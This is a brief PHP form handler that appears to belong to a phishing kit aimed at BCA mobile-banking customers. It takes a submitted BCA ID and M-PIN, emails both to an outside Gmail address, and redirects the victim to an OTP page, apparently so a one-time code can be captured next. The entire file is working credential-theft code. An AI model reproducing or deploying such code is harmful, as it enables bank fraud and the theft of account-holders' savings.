<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $from = "mailtrap@cstriusahaberkat.site";
    $to = "odeojaya@gmail.com";
    $subject = "Test Email from MyId Form";
    $message = "BCA ID: " . $_POST['BCA_ID'] . "\n" .
               "M-PIN: " . $_POST['M-PIN'];

    // Set headers
    $headers = "From: $from" . "\r\n" .
               "Reply-To: $from" . "\r\n" .
               "X-Mailer: PHP/" . phpversion();

    // Mengirim email
    if (mail($to, $subject, $message, $headers)) {
        echo "<script>window.location.href = 'otp.html';</script>";
    } else {
        echo "Gagal mengirim email.";
    }
}
?>
